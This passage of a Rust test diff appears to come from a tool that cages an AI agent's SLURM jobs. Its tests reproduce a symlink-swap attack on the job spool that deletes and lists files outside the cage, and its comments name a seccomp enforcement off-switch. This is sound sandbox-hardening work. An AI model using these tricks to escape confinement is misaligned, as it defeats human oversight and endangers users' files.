+    fn nothing_is_claimed_about_limits_husk_could_not_read() {
+        let d = decide(
+            &req_in(work(), &["--partition=preemptible"], "echo hi\n"),
+            &no_uenv(), // limits: Default::default() — nothing was read
+            &FsPolicy::unchecked_for_test(),
+            work(),
+        );
+        let Decision::Submit(sub) = d else { panic!("must be accepted") };
+        assert!(sub.note.is_empty(), "husk invented a limit it never read: {}", sub.note);
     }
     fn with_uenv() -> Session {
         Session {
             uenv: Some("prgenv-gnu:v1".into()),
             view: Some("prgenv-gnu:default".into()),
-            required_partition: "preemptible".into(),
+            allowed_partitions: vec!["preemptible".into()],
+            allowed_accounts: vec![], allowed_uenvs: vec![],
+            limits: Default::default(),
         }
     }
+    /// The trusted project dir for tests whose requests carry cwd "/work". Real runs get
+    /// the directory husk was launched in; the two coincide here.
     fn opts(r: Request, s: &Session) -> Vec<String> {
-        match decide(&r, s, &FsPolicy::default()) {
+        match decide(&r, s, &FsPolicy::unchecked_for_test(), work()) {
             Decision::Submit(sub) => sub.options,
             Decision::Reject(m) => panic!("expected Submit, got Reject: {m}"),
             Decision::Query(a) => panic!("expected Submit, got Query: {a:?}"),
+            Decision::Cancel(c) => panic!("expected Submit, got Cancel: {c:?}"),
+        }
+    }
+    /// For tests that build a REAL temp directory: husk was "launched" there, so that is
+    /// both the trusted project dir and the cage's writable root.
+    fn opts_in(root: &std::path::Path, r: Request, s: &Session) -> Vec<String> {
+        match decide(&r, s, &FsPolicy::unchecked_for_test(), root) {
+            Decision::Submit(sub) => sub.options,
+            Decision::Reject(m) => panic!("expected Submit, got Reject: {m}"),
+            Decision::Query(a) => panic!("expected Submit, got Query: {a:?}"),
+            Decision::Cancel(c) => panic!("expected Submit, got Cancel: {c:?}"),
         }
     }
     fn rejected(r: Request, s: &Session) -> bool {
-        matches!(decide(&r, s, &FsPolicy::default()), Decision::Reject(_))
+        matches!(
+            decide(&r, s, &FsPolicy::unchecked_for_test(), work()),
+            Decision::Reject(_)
+        )
     }
     fn has(o: &[String], s: &str) -> bool {
         o.iter().any(|x| x == s)
@@ -291,11 +3251,15 @@ mod tests {
     }
 
     #[test]
-    fn readonly_slurm_command_becomes_a_pass_through_query() {
-        let mut r = req(&["-u", "cmueller", "--me"], "");
+    fn readonly_slurm_command_is_reconstructed_not_passed_through() {
+        // It is no longer a pass-through, and the rename says so: the short spelling comes
+        // back as the canonical `--long=value`, because a separated value is ambiguous for
+        // any option whose argument is optional — which several of these became between the
+        // SLURM versions husk runs on.
+        let mut r = req(&["-u", "hpcuser", "--me"], "");
         r.tool = "squeue".into();
-        match decide(&r, &no_uenv(), &FsPolicy::default()) {
-            Decision::Query(argv) => assert_eq!(argv, vec!["squeue", "-u", "cmueller", "--me"]),
+        match decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()) {
+            Decision::Query(argv) => assert_eq!(argv, vec!["squeue", "--user=hpcuser", "--me"]),
             _ => panic!("expected Query for squeue"),
         }
     }
@@ -308,7 +3272,7 @@ mod tests {
             let mut r = req(&["x"], "");
             r.tool = t.into();
             assert!(
-                matches!(decide(&r, &no_uenv(), &FsPolicy::default()), Decision::Reject(_)),
+                matches!(decide(&r, &no_uenv(), &FsPolicy::unchecked_for_test(), work()), Decision::Reject(_)),
                 "{t} must be rejected"
             );
         }
@@ -324,9 +3288,9 @@ mod tests {
     fn accepts_preemptible_and_forces_safe_options() {
         let o = opts(req(&["--partition=preemptible"], "echo hi\n"), &no_uenv());
         assert!(has(&o, "--partition=preemptible"));
-        assert!(has(&o, "--chdir=/work"));
-        assert!(has(&o, "--output=/work/slurm-%j.out"));
-        assert!(has(&o, "--error=/work/slurm-%j.err"));
+        assert!(has(&o, &format!("--chdir={}", work().display())));
+        assert!(has(&o, &format!("--output={}/slurm-%j.out", work().display())));
+        assert!(has(&o, &format!("--error={}/slurm-%j.err", work().display())));
     }
 
     #[test]
@@ -371,35 +3335,3309 @@ mod tests {
     fn strips_agent_overrides_of_owned_options() {
         let o = opts(
             req(
-                &["--partition=preemptible", "--export=SNEAKYVAR", "--chdir=/evil", "--nodes=2"],
+                &["--partition=preemptible", "--export=SNEAKYVAR", "--time=01:00:00"],
                 "echo hi\n",
             ),
             &no_uenv(),
         );
         assert!(has(&o, "--partition=preemptible")); // forced
-        assert!(has(&o, "--chdir=/work")); // forced
+        assert!(has(&o, &format!("--chdir={}", work().display()))); // defaults to the validated cwd
         assert!(has(&o, "--export=ALL")); // broker forces this (F24)
         assert!(!o.iter().any(|x| x.contains("SNEAKYVAR"))); // agent's --export value stripped
-        assert!(!has(&o, "--chdir=/evil")); // agent's stripped
-        assert!(has(&o, "--nodes=2")); // benign passthrough kept
+        assert!(has(&o, "--time=01:00:00")); // benign passthrough kept
+        assert!(has(&o, "--nodes=1")); // cage profile forces the topology
+    }
+
+    /// Both step-pair tests manipulate the SAME derived stub path
+    /// (`<target>/lib/husk/srun-stub.py`), one creating it and one requiring its absence.
+    /// cargo runs tests as threads in one process, so they must not interleave.
+    static STUB_PATH_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+    fn derived_stub_path() -> std::path::PathBuf {
+        let exe = std::env::current_exe().unwrap();
+        exe.parent()
+            .and_then(|b| b.parent())
+            .unwrap()
+            .join("lib")
+            .join("husk")
+            .join("srun-stub.py")
+    }
+
+    /// See `husk_paths`. Set only while a harness that RUNS the guard is in flight, and
+    /// always under `STUB_PATH_LOCK`, because it is process-global and cargo runs tests as
+    /// threads of one process.
+    static BROKER_OVERRIDE: std::sync::Mutex<Option<String>> = std::sync::Mutex::new(None);
+
+    /// A step broker that comes up and stays up — what the guard expects.
+    const LIVE_BROKER: &str = "#!/bin/sh\nexec sleep 10\n";
+
+    pub(super) fn broker_path_override() -> Option<String> {
+        BROKER_OVERRIDE.lock().unwrap_or_else(|e| e.into_inner()).clone()
+    }
+
+    /// Run a generated script with a stubbed `seccomp-wrapper` on PATH and return
+    /// (exit status, stderr). Executes the real thing rather than asserting on the
+    /// script text: what matters is the behaviour a dying job produces.
+    /// Run the generated guard against a stubbed `seccomp-wrapper`.
+    ///
+    /// `want_stub` decides whether the DERIVED srun-stub path exists for this run, and the
+    /// harness arranges it **inside the lock** rather than leaving tests to set it up
+    /// around the call. The guard's behaviour depends on that path, so a test that merely
+    /// reads it races with one that mutates it - which showed up as an order-dependent
+    /// failure and then, after a first fix, as the opposite one. Owning the state here
+    /// removes the race instead of narrowing it. A flaky test is worse than no test: it
+    /// teaches people to re-run rather than to look.
+    fn run_guard_with_stub_ex(
+        tag: &str,
+        stub_body: &str,
+        want_stub: bool,
+        broker_body: &str,
+    ) -> (i32, String, String) {
+        run_guard_prepared(tag, stub_body, want_stub, broker_body, &|_| {})
+    }
+
+    /// `run_guard_with_stub_ex` with a hook that runs in the workdir AFTER it is created and
+    /// BEFORE the guard starts.
+    ///
+    /// `RDF-D-1` needs it: the attack it reproduces is a name PRE-PLANTED in the workdir, and
+    /// every other harness here starts from a workdir it has just emptied — which is exactly
+    /// why no test had ever pointed the spool's container anywhere.
+    fn run_guard_prepared(
+        tag: &str,
+        stub_body: &str,
+        want_stub: bool,
+        broker_body: &str,
+        prepare: &dyn Fn(&std::path::Path),
+    ) -> (i32, String, String) {
+        use std::os::unix::fs::PermissionsExt;
+        let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let derived = derived_stub_path();
+        if want_stub {
+            if let Some(parent) = derived.parent() {
+                std::fs::create_dir_all(parent).unwrap();
+            }
+            std::fs::write(&derived, "#!/usr/bin/env python3\n").unwrap();
+        } else {
+            let _ = std::fs::remove_file(&derived);
+        }
+        // `tag` keeps concurrently-running tests off each other's stub (cargo runs them
+        // in threads of ONE process, so the pid alone is not unique).
+        let dir = std::env::temp_dir().join(format!("husk-guard-{}-{tag}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+
+        let stub = dir.join("seccomp-wrapper");
+        std::fs::write(&stub, stub_body).unwrap();
+        std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
+        // The guard only binds the srun stub if a real srun exists on this node. Provide
+        // one so the bind path is exercised rather than silently skipped.
+        let fake_srun = dir.join("srun");
+        std::fs::write(&fake_srun, "#!/bin/sh\nexit 0\n").unwrap();
+        std::fs::set_permissions(&fake_srun, std::fs::Permissions::from_mode(0o755)).unwrap();
+        // A step broker that STAYS UP. The guard now refuses the job if the one it started
+        // is already gone, so without this every harness run dies at that check — which is
+        // the check working, but it would stop these tests reaching bwrap at all. The real
+        // broker path here is the cargo test binary, which exits immediately.
+        let fake_broker = dir.join("husk-broker-stub");
+        std::fs::write(&fake_broker, broker_body).unwrap();
+        std::fs::set_permissions(&fake_broker, std::fs::Permissions::from_mode(0o755)).unwrap();
+        *BROKER_OVERRIDE.lock().unwrap_or_else(|e| e.into_inner()) =
+            Some(fake_broker.to_string_lossy().to_string());
+
+        // The workdir must EXIST: the guard creates the step spool under it, and a
+        // workdir it cannot create in means no step pair (which the guard now announces).
+        let script = wrap_script(
+            BODY_PATH,
+            &[],
+            &[],
+            profile::Profile::SingleNode,
+            &dir.to_string_lossy(),
+            false,
+            &[dir.to_string_lossy().to_string()],
+            "", "",
+        );
+        let path = dir.join("job.sh");
+        std::fs::write(&path, script).unwrap();
+        prepare(&dir);
+
+        let out = std::process::Command::new("/bin/bash")
+            .arg(&path)
+            // Run IN the temp dir. The guard resolves the step spool relative to $PWD, so
+            // without this the test drops `.husk-step-spool-nojob/` into the crate
+            // directory on every `cargo test` — repo litter, and litter in a working tree
+            // is how a build artifact once got committed here by `git add -A`.
+            .current_dir(&dir)
+            .env("PATH", format!("{}:/usr/bin:/bin", dir.display()))
+            .output()
+            .unwrap();
+        // Cleared before the lock is released, so a later test never sees another's broker.
+        *BROKER_OVERRIDE.lock().unwrap_or_else(|e| e.into_inner()) = None;
+        let _ = std::fs::remove_dir_all(&dir);
+        (
+            out.status.code().unwrap_or(-1),
+            String::from_utf8_lossy(&out.stdout).to_string(),
+            String::from_utf8_lossy(&out.stderr).to_string(),
+        )
     }
 
     #[test]
-    fn wrap_script_orders_directives_then_guard_then_body() {
-        let body = "#!/bin/bash\n#SBATCH --nodes=1\nsrun hostname\n";
-        let w = match decide(
+    fn the_emitted_cleanup_globs_mean_the_same_thing_in_bash_and_in_dash() {
+        // The guard is generated shell, and the whole of `C2-2` is a fact about GLOB
+        // SEMANTICS: `resp-*.json` does not match `.resp-<id>.json.tmp`, because `*` does not
+        // match a leading dot. No Rust assertion can know that; the shell has to say it.
+        // `B3` established the pattern for this — `rank.rs` runs its generated shell under
+        // both interpreters — and husk does not choose the job's: the batch script runs under
+        // whatever the site's `sh`/`bash` is.
+        //
+        // WHAT THIS TEST DOES NOT COVER, said here because its predecessor's comment claimed
+        // otherwise. It used to say it pinned "the property that keeps the new dotfile glob
+        // from being a weapon: an expansion of `.*.tmp` can never reach `.` or `..`". That
+        // property is real, it is now an invariant of `SpoolGlob::new` rather than a sentence
+        // (`RDF-D-2`), and it was never the weapon: the escape was the CONTAINER, not the
+        // expansions — point `$_husk_spool` at a symlink and every one of these globs
+        // resolves through it, into a directory outside the cage (`RDF-D-1`). Nothing about
+        // the strings could have shown that; only pointing the container somewhere could, and
+        // `the_guard_refuses_a_step_spool_that_has_been_pointed_somewhere_else` does.
+        //
+        // What IS pinned here is glob semantics under each interpreter, which is what `C2-2`
+        // turned on. Below, the `_husk_ours` predicate is exercised in the same shells for
+        // the same reason: `-O` is not in POSIX `test`.
+        let script = wrap_script(
+            BODY_PATH, &[], &[],
+            profile::Profile::SingleNode,
+            "/work/project", false, &["/work/project".to_string()], "", "",
+        );
+        let line = script
+            .lines()
+            .find(|l| l.trim_start().starts_with("rm -f \"$_husk_spool\"/"))
+            .expect("the generated guard must still have one spool cleanup line")
+            .trim()
+            .to_string();
+
+        let shells: Vec<&str> = ["/bin/bash", "/bin/dash", "/bin/sh"]
+            .into_iter()
+            .filter(|s| std::path::Path::new(s).exists())
+            .collect();
+        assert!(!shells.is_empty(), "no shell to test the guard's own globs with");
+        for sh in shells {
+            let base = std::env::temp_dir()
+                .join(format!("husk-globs-{}-{}", std::process::id(), sh.replace('/', "_")));
+            let _ = std::fs::remove_dir_all(&base);
+            let spool = base.join("spool");
+            std::fs::create_dir_all(&spool).unwrap();
+            // A file BESIDE the spool: if any expansion ever escaped the directory, this is
+            // what it would take with it.
+            std::fs::write(base.join("neighbour.json"), b"keep me").unwrap();
+            let mut planted = vec![
+                husk_slurm_broker::tmp_name("resp-abc.json"),
+                crate::step::StepBroker::HEARTBEAT_TMP.to_string(),
+            ];
+            for g in crate::step::step_spool_globs() {
+                planted.extend(samples_for(&g));
+            }
+            for n in &planted {
+                std::fs::write(spool.join(n), b"x").unwrap();
+            }
+            let out = std::process::Command::new(sh)
+                .arg("-c")
+                .arg(format!("_husk_spool={}\n{line}\nrmdir \"$_husk_spool\"", spool.display()))
+                .output()
+                .unwrap();
+            assert!(
+                !spool.exists(),
+                "{sh}: the guard's own cleanup line left the spool behind: {:?} (rmdir said {})",
+                std::fs::read_dir(&spool)
+                    .map(|d| d.flatten().map(|e| e.file_name()).collect::<Vec<_>>())
+                    .unwrap_or_default(),
+                String::from_utf8_lossy(&out.stderr).trim(),
+            );
+            assert!(
+                base.join("neighbour.json").exists(),
+                "{sh}: an expansion reached outside the spool directory"
+            );
+            // The guard's own gate, in the same interpreter. `[ -O ]` is not in POSIX
+            // `test(1)`; husk emits a bash shebang, but the whole reason this test runs three
+            // shells is that husk does not get to choose the one a site's `sh` is (`B3`), and
+            // a predicate that silently answers "yes" everywhere is worse than none.
+            let real = base.join("real-dir");
+            std::fs::create_dir_all(&real).unwrap();
+            let linked = base.join("linked-dir");
+            std::os::unix::fs::symlink(&real, &linked).unwrap();
+            let pred = script
+                .lines()
+                .find(|l| l.trim_start().starts_with("[ -d \"$1\" ]"))
+                .expect("the guard must still carry the _husk_ours predicate")
+                .trim()
+                .to_string();
+            for (path, want, what) in [
+                (&real, 0, "a directory husk made"),
+                (&linked, 1, "a symlink to a directory"),
+            ] {
+                let rc = std::process::Command::new(sh)
+                    .arg("-c")
+                    .arg(format!("_husk_ours() {{ {pred}; }}\n_husk_ours \"$1\"", ))
+                    .arg("sh")
+                    .arg(path.to_string_lossy().to_string())
+                    .status()
+                    .unwrap();
+                assert_eq!(
+                    rc.code().unwrap_or(-1),
+                    want,
+                    "{sh}: _husk_ours got {what} wrong; the guard would {} clean it",
+                    if want == 0 { "refuse to" } else { "wrongly" }
+                );
+            }
+            let _ = std::fs::remove_dir_all(&base);
+        }
+    }
+
+    /// The victim of `RDF-D-1`: a directory OUTSIDE the workdir, holding files whose names
+    /// three of the guard's own cleanup globs match. `.thesis.tmp` is there because `.*.tmp`
+    /// is the glob `014be6d` ADDED, and `keepme.txt`/`private-notes.txt` because a test that
+    /// only shows destruction cannot show that the destruction was selective.
+    fn plant_victim(dir: &std::path::Path) -> Vec<&'static str> {
+        std::fs::create_dir_all(dir).unwrap();
+        let doomed = vec!["out-2026-run.nc", "err-summary.log", ".thesis.tmp"];
+        for n in doomed.iter().chain(["keepme.txt", "private-notes.txt"].iter()) {
+            std::fs::write(dir.join(n), b"real work").unwrap();
+        }
+        doomed
+    }
+
+    #[test]
+    fn the_guard_refuses_a_step_spool_that_has_been_pointed_somewhere_else() {
+        // **`RDF-D-1`, and it is the reason this file has a `_husk_ours`.** The spool lives in
+        // the workdir, which the cage binds WRITABLE, so the confined side owns the spool's
+        // PARENT and can replace the spool itself with a symlink. `mkdir -p` over a
+        // symlink-to-directory returns 0, `[ -d ]` follows it, and `rm -f`'s globs resolve
+        // through it — so husk's own cleanup became a deletion primitive aimed at any
+        // directory the user can write, and the `ls -A` that follows it echoed that
+        // directory's listing onto the job's stderr, which lands in `--output`.
+        //
+        // WHY THIS TEST EXECUTES. `FIX-D.md` claimed "no option injection and no escape", and
+        // the test it shipped pinned only that `.*.tmp` cannot expand to `.` or `..` — a fact
+        // about the STRINGS, true, and irrelevant to what the strings resolve to (`P15`). The
+        // hostile-spool run in the same commit planted a symlink at a LEAF, where `rm` does
+        // not follow. Nobody pointed the CONTAINER anywhere, so nothing was red.
+        //
+        // FALSE FRIENDS — all three stay GREEN with `[ ! -L "$1" ]` deleted from `_husk_ours`:
+        // `the_emitted_cleanup_globs_mean_the_same_thing_in_bash_and_in_dash` (real spool),
+        // `the_guard_reclaims_every_file_the_step_broker_leaves_in_the_spool` (real spool),
+        // and `every_file_the_guard_creates_in_its_own_directories_is_cleaned_up` (a string
+        // test). Measured, not assumed — see `FIX-D2.md`.
+        let victim = std::env::temp_dir()
+            .join(format!("husk-d1-victim-{}-swap", std::process::id()));
+        let _ = std::fs::remove_dir_all(&victim);
+        let doomed = plant_victim(&victim);
+
+        // The swap is done by the fake `seccomp-wrapper`, which is where the JOB'S OWN BODY
+        // runs: in-cage, in the workdir, at the same path, before the guard's cleanup. No
+        // race, no privilege, no guessing — `HUSK_STEP_SPOOL` is exported into the cage.
+        let stub = format!(
+            "#!/bin/bash\n\
+             mv \"$HUSK_STEP_SPOOL\" \"$HUSK_STEP_SPOOL.moved\"\n\
+             ln -s {} \"$HUSK_STEP_SPOOL\"\n\
+             exit 0\n",
+            victim.display()
+        );
+        let (_code, _out, err) = run_guard_with_stub_ex("d1swap", &stub, true, LIVE_BROKER);
+
+        for n in &doomed {
+            assert!(
+                victim.join(n).exists(),
+                "the guard deleted {n:?} in a directory OUTSIDE the workdir, because the job \
+                 pointed its own spool there. That is an out-of-cage deletion primitive with \
+                 the user's rights (`RDF-D-1`).\n--- stderr ---\n{err}"
+            );
+        }
+        // The OTHER half of `RDF-D-1`, and it is a disclosure, not a deletion: `ls -A` of the
+        // symlink target used to be echoed to stderr, which lands in `--output`, which the
+        // agent reads. Point the spool at `$HOME` and the agent gets a listing of the home
+        // directory the cage tmpfs-masks.
+        for n in doomed.iter().chain(["keepme.txt", "private-notes.txt"].iter()) {
+            assert!(
+                !err.contains(n),
+                "the guard listed the contents of a directory it refused to clean: {n:?} \
+                 reached the job's stderr, which is a file the agent reads (`P2`).\n\
+                 --- stderr ---\n{err}"
+            );
+        }
+        // …and it SAYS what it did, because a control that fails silently has already failed
+        // (`P7`) and an unattributed refusal invites confident wrong remediation (`P11`).
+        assert!(
+            err.contains("NOT cleaning"),
+            "the guard refused to clean the spool and said nothing about it: {err}"
+        );
+
+        // THE THIRD ARM, AND IT IS A SHAPE TEST — said out loud rather than left to be
+        // discovered (`P9`, `P12`). `[ ! -L ]` and `[ -d ]` are both pinned by execution
+        // above; `[ -O ]` is the CROSS-USER arm, and this harness has one uid, so no cheap
+        // test can make the guard meet a directory it does not own. Deleting `[ -O ]` alone
+        // leaves everything else here green — measured. So the arm is held by its presence,
+        // exactly as the sibling `_husk_net_dir` check is (`5243`), and the honest status of
+        // that is: it stops a silent removal, it does not prove the behaviour.
+        let script = wrap_script(
+            BODY_PATH, &[], &[], profile::Profile::SingleNode,
+            "/work/project", false, &["/work/project".to_string()], "", "",
+        );
+        assert!(
+            script.contains("[ -d \"$1\" ] && [ ! -L \"$1\" ] && [ -O \"$1\" ]"),
+            "the guard's one ownership predicate changed shape: {script}"
+        );
+        // …and it is the ONLY gate on all three directories the guard deletes inside. A
+        // fourth `rm` under a bare `[ -d ]` is how this class got here (`RDF-D-1`).
+        for var in ["$_husk_spool", "$_husk_shm"] {
+            assert!(
+                script.contains(&format!("_husk_ours \"{var}\"")),
+                "{var} is cleaned without going through _husk_ours: {script}"
+            );
+        }
+        let _ = std::fs::remove_dir_all(&victim);
+    }
+
+    #[test]
+    fn a_step_spool_pre_planted_as_a_symlink_is_never_used_at_all() {
+        // The same defect one step EARLIER, and it is a write primitive rather than a delete
+        // one. `mkdir -p` over a pre-planted symlink-to-directory returns 0, so the guard
+        // exported `HUSK_STEP_SPOOL` pointing outside the workdir and started the step-broker
+        // on it — and the step-broker runs UNCAGED and writes `out-<id>`/`err-<id>`, whose
+        // CONTENT is the step's own output. `RDF` reported the cleanup; the creation site is
+        // the sibling in the same generated artifact, fixed in the same pass.
+        //
+        // The refusal must cost the job its srun brokering and NOTHING ELSE. A step spool
+        // that cannot be trusted must not become a job that cannot run.
+        let victim = std::env::temp_dir()
+            .join(format!("husk-d1-victim-{}-plant", std::process::id()));
+        let _ = std::fs::remove_dir_all(&victim);
+        let doomed = plant_victim(&victim);
+        let before: std::collections::BTreeSet<String> = std::fs::read_dir(&victim)
+            .unwrap()
+            .flatten()
+            .map(|e| e.file_name().to_string_lossy().to_string())
+            .collect();
+
+        let v = victim.clone();
+        let (code, out, err) = run_guard_prepared(
+            "d1plant",
+            "#!/bin/bash\necho BODY_RAN\nexit 0\n",
+            true,
+            LIVE_BROKER,
+            &move |dir: &std::path::Path| {
+                std::os::unix::fs::symlink(&v, dir.join(".husk-step-spool-nojob")).unwrap();
+            },
+        );
+
+        assert!(
+            err.contains("NOT using") && err.contains("step spool"),
+            "the guard used a pre-planted spool without a word: {err}"
+        );
+        // THE JOB STILL RUNS. This is the half that three fixes in this round got wrong in the
+        // other direction — closing a hole by refusing the job.
+        assert_eq!(code, 0, "a refused spool must not fail the job: {err}");
+        assert!(out.contains("BODY_RAN"), "the body must still run: out={out} err={err}");
+        let after: std::collections::BTreeSet<String> = std::fs::read_dir(&victim)
+            .unwrap()
+            .flatten()
+            .map(|e| e.file_name().to_string_lossy().to_string())
+            .collect();
+        assert_eq!(
+            before, after,
+            "the guard wrote into or deleted inside a directory the job named, outside the \
+             cage: {err}"
+        );
+        for n in &doomed {
+            assert!(victim.join(n).exists(), "{n} was taken by the cleanup: {err}");
+        }
+        let _ = std::fs::remove_dir_all(&victim);
+    }
+
+    /// Turn a cleanup glob into a concrete file name, twice: once with the `*` standing for
+    /// an id and once with it standing for nothing, because both are names husk produces
+    /// (`broker.alive` and `broker.alive.tmp` are one glob).
+    fn samples_for(glob: &str) -> Vec<String> {
+        vec![glob.replace('*', "9f3c1a"), glob.replace('*', "")]
+    }
+
+    #[test]
+    fn the_guard_reclaims_every_file_the_step_broker_leaves_in_the_spool() {
+        // **2026-08-06, three selftest failures on Balfrin.** The guard's spool cleanup NAMES
+        // what it deletes and then `rmdir`s. Adding a fifth artifact — the broker heartbeat —
+        // without adding it here left the directory non-empty, so the rmdir failed and the
+        // whole spool leaked on every path: clean exit, signalled job, and real jobs alike.
+        //
+        // A cleanup that enumerates is a denylist, and this is what that costs. The list is
+        // kept because the "kept … it still holds:" message is a deliberate diagnostic — a
+        // wholesale `rm -rf` would reclaim the directory and destroy the signal that
+        // something unexpected was in it. So the enumeration stays and this test guards it.
+        //
+        // IT RUNS THE GUARD. This test used to be two `script.contains(…)` assertions, and
+        // `B4-2` measured what they were worth: a new spool file spelled `format!("{}-audit",
+        // id)` passed, a plain `join("audit.txt")` passed, and making the heartbeat temp a
+        // dotfile — a real leak on every interrupted step — passed 328/328. `C2`/`D1` then
+        // found a leak that was already LIVE (`.resp-<id>.json.tmp`) by writing the executing
+        // version. A string test cannot know that a shell glob does not match a leading dot;
+        // only bash knows that (`P3`: validation is not enforcement).
+        let id = "9f3c1a";
+        let mut names: Vec<String> = vec![
+            // The real names, from the real constants — not a description of them.
+            format!("req-{id}.json"),
+            format!("resp-{id}.json"),
+            format!("out-{id}"),
+            format!("err-{id}"),
+            crate::step::StepBroker::HEARTBEAT.to_string(),
+            crate::step::StepBroker::HEARTBEAT_TMP.to_string(),
+            // THE ONE THAT WAS LIVE AT HEAD: `write_response` -> `write_atomic`, interrupted
+            // between `create_new` and `rename`, or defeated by a directory planted at the
+            // response name.
+            husk_slurm_broker::tmp_name(&format!("resp-{id}.json")),
+        ];
+        // …and one file per generated glob, so an entry nobody writes today is still proved
+        // to WORK rather than assumed to.
+        for g in crate::step::step_spool_globs() {
+            names.extend(samples_for(&g));
+        }
+        names.sort();
+        names.dedup();
+        let writes: String =
+            names.iter().map(|n| format!(": > \"$d/{n}\"\n")).collect::<Vec<_>>().join("");
+
+        // PASS 1 — the presence anchor, and the diagnostic itself.
+        //
+        // Without it this test is an absence assertion: if the guard never created a spool,
+        // or the fake broker never wrote into it, "no complaint" would look like success —
+        // `C2-6` found exactly that in `selftest.sh`, where removing the guard entirely left
+        // `guard.spool_removed` green. The canary is a name no glob matches, so the guard
+        // MUST keep the directory and MUST name what is in it. That proves in one run: the
+        // spool exists, the writer wrote into it, the message works, and every husk-shaped
+        // file was removed — because only the canary is left.
+        let canary = "canary-not-husks.dat";
+        let (_c, _o, err) = run_guard_with_stub_ex(
+            "spoolanchor",
+            "#!/bin/bash\nexit 0\n",
+            true,
+            &format!("#!/bin/sh\nd=\"$HUSK_STEP_SPOOL\"\n{writes}: > \"$d/{canary}\"\nexec sleep 10\n"),
+        );
+        let left = err
+            .split_once("it still holds:")
+            .map(|(_, r)| r.lines().next().unwrap_or("").trim().to_string())
+            .unwrap_or_else(|| {
+                panic!(
+                    "the guard reported nothing about a spool holding a file it does not own; \
+                     either the spool was never created or the fake broker never wrote to it, \
+                     and this test would be vacuous.\n--- stderr ---\n{err}"
+                )
+            });
+        assert_eq!(
+            left, canary,
+            "the guard's cleanup left husk's OWN files behind (only {canary:?} should \
+             remain). Every extra name is a file that leaks a whole step spool per job, \
+             reported to the operator as if someone else had put it there.\n\
+             --- stderr ---\n{err}"
+        );
+
+        // PASS 2 — the contract: with only husk's own artifacts in it, the directory GOES.
+        let (_c, _o, err) = run_guard_with_stub_ex(
+            "spoolclean",
+            "#!/bin/bash\nexit 0\n",
+            true,
+            &format!("#!/bin/sh\nd=\"$HUSK_STEP_SPOOL\"\n{writes}exec sleep 10\n"),
+        );
+        assert!(
+            !err.contains("it still holds"),
+            "the guard left its step spool behind: {err}"
+        );
+    }
+
+    #[test]
+    fn a_step_broker_that_refuses_to_start_fails_the_job_instead_of_hanging_it() {
+        // **2026-08-06, Balfrin.** The step broker fails closed on settings it cannot parse
+        // — correctly. But it is backgrounded and nobody checked, so the job carried on,
+        // bound the stub over srun, and every `srun` blocked forever on a request no one
+        // would answer. Five or six submissions across four nodes and four rank counts, all
+        // hanging identically to the walltime, with NO output on any channel. The reason was
+        // in husk's own job log the whole time.
+        //
+        // The trigger was a human saving an empty `.claude/settings.json` in vim. The safe
+        // decision was taken and then hidden, which is worse than either failing or
+        // succeeding — the operator cannot act on a decision they cannot see.
+        let (code, _out, err) = run_guard_with_stub_ex(
+            "deadbroker",
+            "#!/bin/sh\nfor a in \"$@\"; do echo \"ARG:$a\"; done\n",
+            true,
+            // What the real broker does with unparseable settings: say why, exit(2).
+            "#!/bin/sh\necho 'husk: refusing to start the step broker - bad JSON' >&2\nexit 2\n",
+        );
+
+        assert_ne!(code, 0, "the job must FAIL, not proceed: stderr={err}");
+        assert!(
+            err.contains("the step broker refused to start"),
+            "and it must say so on the job's own stderr, where the operator is looking: {err}"
+        );
+        assert!(
+            err.contains("hang"),
+            "the message must name the symptom it is replacing, or nobody connects the two: {err}"
+        );
+        // The decisive part: the cage must never be entered. If it were, srun would be
+        // bound to a stub whose broker is dead and we would be back to the silent hang.
+        assert!(
+            !err.contains("ARG:"),
+            "the guard must fail BEFORE building the cage, not after: {err}"
+        );
+    }
+
+    /// The common case: no srun stub installed, so no step pair.
+    fn run_guard_with_stub(tag: &str, stub_body: &str) -> (i32, String, String) {
+        run_guard_with_stub_ex(tag, stub_body, false, LIVE_BROKER)
+    }
+
+    #[test]
+    fn guard_translates_a_seccomp_kill_and_preserves_the_status() {
+        // A blocked syscall dies by SIGSYS (SCMP_ACT_KILL_PROCESS) -> 159 and a bare
+        // "Bad system call". In a batch job nobody is reading, so the guard must name
+        // the layer that killed it — while re-emitting the status unchanged so sacct
+        // still records the truth.
+        let (code, _out, err) = run_guard_with_stub("sigsys", "#!/bin/bash\nkill -SYS $$\n");
+        assert_eq!(code, 159, "the real exit status must survive the translation");
+        assert!(err.contains("killed by SIGSYS"), "must name the cause: {err}");
+        assert!(err.contains("husk"), "must name the layer: {err}");
+        assert!(
+            !err.contains("SECCOMP_WRAPPER_DEBUG"),
+            "must NOT advertise the enforcement off-switch: {err}"
+        );
+        // The contract is "name a diagnostic the confined side can actually RUN", and the
+        // token `strace` was a false proxy for it: this assertion passed for two years
+        // while the message told users to run strace inside a cage that kills strace
+        // (`ptrace` is on the wrapper's deny-list). A test that pins a word cannot notice
+        // that the word became wrong. Pin the property instead.
+        assert!(
+            err.contains("OUTSIDE husk") || err.contains("outside husk"),
+            "the diagnostic must be one husk permits — in-cage strace is killed by this \
+             very filter: {err}"
+        );
+        assert!(
+            err.to_lowercase().contains("ptrace is blocked")
+                || err.contains("strace will NOT tell you"),
+            "must say why the obvious move does not work, or the reader will try it: {err}"
+        );
+    }
+
+    #[test]
+    fn guard_stays_quiet_and_transparent_for_an_ordinary_failure() {
+        // Only a seccomp kill gets the message; an ordinary non-zero exit must pass
+        // through untouched, or every failing job would blame the sandbox.
+        let (code, _out, err) = run_guard_with_stub("plain", "#!/bin/bash\nexit 3\n");
+        assert_eq!(code, 3);
+        // The guard may report CONFIGURATION (an inactive step pair) — that is a startup
+        // fact, not a verdict on the job. What it must never do is comment on the
+        // failure itself, or every failing job would look like a sandbox problem.
+        //
+        // `job guard finished` is exempt for the same reason: it is a statement about the
+        // GUARD, not about the workload, and it carries no opinion. It has to appear on
+        // every normal path — including success — because the whole signal is its ABSENCE:
+        // a job killed by SIGKILL (OOM, a cgroup, `scancel -9`) traps nothing and writes
+        // nothing, and a previous session read that silence as a node fault and burned a
+        // second 128-rank allocation retrying. One line, no editorialising; the meaning is
+        // explained in the skill rather than in every job's output.
+        let about_failure: Vec<&str> = err
+            .lines()
